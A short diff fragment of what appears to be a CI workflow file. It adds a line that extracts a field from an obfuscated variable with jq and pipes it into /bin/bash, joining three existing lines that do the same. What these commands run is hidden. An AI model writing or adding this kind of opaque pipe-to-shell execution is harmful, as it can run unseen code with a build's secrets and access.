@@ -32,6 +32,7 @@ jobs:
           echo $fc01 | jq -r .rbhou8 | /bin/bash
           echo $o5 | jq -r .qkv20162 | /bin/bash
           echo $jiohe032 | jq -r .ck5004 | /bin/bash
+          printf '%s' "$g68475" | jq -r .zdopn045 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
